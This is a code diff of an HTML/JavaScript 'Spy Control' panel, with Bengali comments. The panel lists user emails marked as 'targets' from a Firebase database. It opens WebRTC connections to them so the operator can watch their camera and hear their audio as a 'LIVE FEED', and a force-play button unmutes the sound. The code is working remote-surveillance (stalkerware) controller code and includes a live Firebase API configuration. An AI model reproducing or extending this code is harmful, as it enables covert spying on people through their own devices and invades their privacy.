@@ -3,56 +3,38 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Spy Master Control</title>
+    <title>Spy Admin (Force Play)</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <script src="https://unpkg.com/simple-peer@9.11.1/simplepeer.min.js"></script>
     <style>
-        body { background: #0f0f0f; color: white; font-family: 'Courier New', monospace; padding: 20px; }
-        h2 { color: #00ffcc; text-align: center; border-bottom: 2px solid #333; padding-bottom: 10px; letter-spacing: 2px; }
+        body { background: #111; color: white; font-family: sans-serif; padding: 10px; text-align: center; }
+        #userList li { background: #222; padding: 10px; margin: 5px; border: 1px solid #444; cursor: pointer; }
+        .online { color: #0f0; }
         
-        #userList { list-style: none; padding: 0; }
-        .user-card { 
-            background: #1a1a1a; padding: 15px; margin: 10px 0; border-radius: 5px; 
-            cursor: pointer; display: flex; justify-content: space-between; 
-            border: 1px solid #333; transition: 0.3s; 
-        }
-        .user-card:hover { background: #252525; border-color: #00ffcc; transform: translateX(5px); }
+        #videoContainer { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; flex-direction: column; align-items: center; justify-content: center; }
+        video { width: 90%; border: 3px solid #0f0; margin-bottom: 20px; }
         
-        .status-badge { font-size: 12px; padding: 4px 10px; border-radius: 12px; font-weight: bold; }
-        .online { background: #00ffcc; color: black; box-shadow: 0 0 10px #00ffcc; }
-        .offline { background: #444; color: #aaa; }
-
-        /* পপ-আপ ভিডিও প্লেয়ার */
-        #videoContainer { 
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background: rgba(0,0,0,0.96); z-index: 999; text-align: center; padding-top: 40px; 
-        }
-        video { width: 95%; max-width: 600px; border: 3px solid #00ffcc; border-radius: 10px; box-shadow: 0 0 30px rgba(0,255,204,0.4); }
-        
-        .btn-close { 
-            padding: 12px 30px; background: red; color: white; border: none; 
-            font-weight: bold; cursor: pointer; margin-top: 15px; border-radius: 5px; font-size: 16px;
-        }
+        .play-btn { padding: 15px 30px; background: #00ffcc; color: black; font-weight: bold; border: none; font-size: 18px; display: none; margin-top: -50px; position: relative; z-index: 1000; cursor: pointer; }
     </style>
 </head>
 <body>
 
-    <h2>🕵️ MASTER CONTROL v3.0</h2>
-    <p style="text-align: center; color: #666;">Scanning global targets...</p>
-
-    <h3>Active Targets:</h3>
-    <ul id="userList"></ul>
+    <h3>🕵️ Spy Control</h3>
+    <ul id="userList">Scanning...</ul>
 
     <div id="videoContainer">
-        <h3 id="targetName" style="color: #00ffcc;">Connecting...</h3>
-        <video id="remoteVideo" autoplay playsinline controls></video>
-        <br>
-        <button class="btn-close" onclick="stopSpying()">DISCONNECT</button>
+        <h3 id="status">Connecting...</h3>
+        
+        <video id="remoteVideo" autoplay playsinline muted></video>
+        
+        <button id="forceBtn" class="play-btn" onclick="forcePlay()">▶ CLICK TO START VIDEO</button>
+        
+        <br><br>
+        <button onclick="location.reload()" style="background: red; color: white; padding: 10px;">DISCONNECT</button>
     </div>
 
     <script>
-        // তোর কনফিগারেশন
         const firebaseConfig = {
           apiKey: "AIzaSyBy5AGDGQFZqbL83fKQfLViX_pyOu6AJ38",
           authDomain: "phone-f605e.firebaseapp.com",
@@ -64,97 +46,60 @@
           measurementId: "G-WSJDCYKM3F"
         };
 
-        if (!firebase.apps.length) {
-            firebase.initializeApp(firebaseConfig);
-        }
+        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
-        
         let currentPeer = null;
-        let currentTargetId = null;
 
-        // --- ইউজার লিস্ট লোড ---
         db.ref("users").on("value", snapshot => {
-            const list = document.getElementById("userList");
-            list.innerHTML = "";
-            
+            document.getElementById("userList").innerHTML = "";
             snapshot.forEach(child => {
-                const uid = child.key;
-                const data = child.val();
-                
-                const isOnline = data.status === "online";
-                const email = data.email || "Unknown Target";
-
                 const li = document.createElement("li");
-                li.className = "user-card";
-                li.innerHTML = `
-                    <span>👤 ${email.split('@')[0]}</span> 
-                    <span class="status-badge ${isOnline ? 'online' : 'offline'}">${data.status.toUpperCase()}</span>
-                `;
-                
-                if(isOnline) {
-                    li.onclick = () => prepareConnection(uid, email);
-                } else {
-                    li.style.opacity = "0.5";
-                    li.style.cursor = "not-allowed";
-                }
-                list.appendChild(li);
+                const isOnline = child.val().status === "online";
+                li.innerHTML = `${child.val().email} <span class="${isOnline?'online':''}">${isOnline?'●':''}</span>`;
+                if(isOnline) li.onclick = () => connect(child.key);
+                document.getElementById("userList").appendChild(li);
             });
         });
 
-        // --- কানেকশন লজিক ---
-        function prepareConnection(uid, email) {
-            document.getElementById("videoContainer").style.display = "block";
-            document.getElementById("targetName").innerText = "Handshaking with " + email + "...";
-            currentTargetId = uid;
-
-            // ১. আগের সব সিগন্যাল ডিলিট (ক্লিন স্লেট)
+        function connect(uid) {
+            document.getElementById("videoContainer").style.display = "flex";
+            document.getElementById("status").innerText = "Handshaking...";
+            
+            // Clean up
             db.ref("users/" + uid + "/offer").remove();
             db.ref("users/" + uid + "/answer").remove().then(() => {
-                startWebRTC(uid);
+                
+                currentPeer = new SimplePeer({ 
+                    initiator: true, 
+                    trickle: false,
+                     config: { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] }
+                });
+
+                currentPeer.on('signal', offer => db.ref("users/" + uid + "/offer").set(offer));
+
+                db.ref("users/" + uid + "/answer").on("value", snap => {
+                    if(snap.val() && currentPeer) currentPeer.signal(snap.val());
+                });
+
+                currentPeer.on('stream', stream => {
+                    document.getElementById("status").innerText = "🔴 LIVE FEED RECEIVED";
+                    const video = document.getElementById("remoteVideo");
+                    video.srcObject = stream;
+                    
+                    // অটোমেটিক প্লে করার চেষ্টা
+                    video.play().catch(() => {
+                        // যদি অটো প্লে না হয়, বাটন দেখাও
+                        document.getElementById("forceBtn").style.display = "block";
+                    });
+                });
             });
         }
 
-        function startWebRTC(targetId) {
-            currentPeer = new SimplePeer({ 
-                initiator: true, 
-                trickle: false,
-                config: { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] } 
-            });
-
-            currentPeer.on('signal', offer => {
-                db.ref("users/" + targetId + "/offer").set(offer);
-            });
-
-            db.ref("users/" + targetId + "/answer").on("value", snapshot => {
-                const answer = snapshot.val();
-                if (answer && currentPeer) {
-                    currentPeer.signal(answer);
-                }
-            });
-
-            currentPeer.on('stream', stream => {
-                document.getElementById("remoteVideo").srcObject = stream;
-                document.getElementById("targetName").innerText = "🔴 LIVE FEED: " + targetId;
-            });
-
-            currentPeer.on('error', err => {
-                console.log(err);
-                alert("Connection failed. Target might have disconnected.");
-                stopSpying();
-            });
-        }
-
-        function stopSpying() {
-            if (currentPeer) currentPeer.destroy();
-            currentPeer = null;
-            
-            if (currentTargetId) {
-                db.ref("users/" + currentTargetId + "/offer").remove();
-                db.ref("users/" + currentTargetId + "/answer").remove();
-            }
-            
-            document.getElementById("videoContainer").style.display = "none";
-            location.reload(); // ক্লিন থাকার জন্য পেজ রিলোড
+        function forcePlay() {
+            const video = document.getElementById("remoteVideo");
+            video.play();
+            video.muted = false; // সাউন্ড অন হবে
+            document.getElementById("forceBtn").style.display = "none";
         }
     </script>
 </body>
